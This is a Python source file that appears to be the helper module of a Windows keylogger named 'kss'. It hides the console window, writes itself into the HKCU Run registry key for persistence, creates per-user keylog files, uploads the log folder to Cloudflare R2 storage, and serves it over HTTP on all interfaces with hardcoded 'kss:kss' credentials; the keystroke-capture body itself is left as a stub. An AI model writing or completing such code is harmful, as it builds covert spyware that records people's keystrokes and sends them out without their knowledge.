import socket
import os
import datetime
import winreg
import http.server
import base64
import socketserver
from log_utils import log_console
from sync_r2 import R2FolderSync


def user_name():
    return os.getlogin()


def current_time():
    return datetime.datetime.now().strftime("%Y%m%d-%H%M%S")


def dir_path():
    home_path = os.path.expanduser("~")
    dir_name = "kss"
    app_root = os.path.join(home_path, dir_name)
    dir_path = os.path.join(app_root, user_name())
    if not os.path.exists(dir_path):
        os.makedirs(dir_path)
    os.chdir(dir_path) 
    return dir_path


# #this hide function help to minimize the console
def hide_console():
    try:
        import win32console, win32gui

        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True
    except Exception as e:
        log_console(f"Failed to hide console: {e}", "ERROR")
        return False


def add_startup():
    """
    Add this script to Windows startup.
    """
    try:
        pth = os.path.dirname(os.path.realpath(__file__))
        s_name = "kss.py"
        address = os.path.join(pth, s_name)
        key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(open_key, "kss", 0, winreg.REG_SZ, address)
        winreg.CloseKey(open_key)
        log_console("Added to startup successfully.", "SUCCESS")
    except Exception as e:
        log_console(f"Failed to add to startup: {e}", "ERROR")


# check if internet is connected or not
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False


# Upload log directory to ftp server
def sync(sync_interval=5, continuous=False):
    """
    Sync the 'kss' directory in the user's home folder to Cloudflare R2.
    If continuous=True, runs in a loop with the given interval.
    """
    try:
        home_path = os.path.expanduser("~")
        dir_list = os.listdir(home_path)
        if "kss" in dir_list:
            source_path = os.path.join(home_path, "kss")
            syncer = R2FolderSync(local_folder=source_path, sync_interval=sync_interval)
            log_console(f"Starting sync for folder: {source_path}", "INFO")
            if continuous:
                log_console(f"Continuous sync enabled. Interval: {sync_interval} seconds.", "INFO")
                syncer.start_sync_loop()  # Handles its own interval and loop
            else:
                syncer.sync_once()
                log_console("Sync completed.", "SUCCESS")
        else:
            log_console("No 'kss' directory found in home path. Sync skipped.", "WARNING")
    except Exception as e:
        log_console(f"Error during sync: {e}", "ERROR")


class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        auth_header = self.headers.get("Authorization")
        if not auth_header:
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="Test"')
            self.end_headers()
            log_console("Unauthorized", "WARNING")
            return
        auth_type, auth_string = auth_header.split()
        try:
            creds = base64.b64decode(auth_string).decode().split(":")
        except Exception:
            self.send_error(400, "Bad request")
            log_console("Malformed Authorization header", "ERROR")
            return
        if auth_type != "Basic" or creds != ["kss", "kss"]:
            self.send_error(401, "Unauthorized")
            log_console("Unauthorized", "WARNING")
            return
        log_console(f"Authorized: {self.client_address[0]}", "INFO")
        super().do_GET()


def server(port=8000):
    """Starts the local HTTP server with basic authentication."""
    handler = AuthHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        log_console(f"Server at http://localhost:{port}", "SUCCESS")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            log_console("Server stopped", "INFO")


def active_interface():
    # TODO: Implement actual logic if needed
    return "Ethernet"


def key_logger():
    log_console("Key Logger started and running...", "INFO")
    log_dir = dir_path()  # Ensure this returns the full path to your log directory
    log_filename = os.path.join(log_dir, f"keylog-{user_name()}_{current_time()}.txt")
    # logger = setup_logger(log_filename, "KeyLogger")
    # ... rest of your code ...
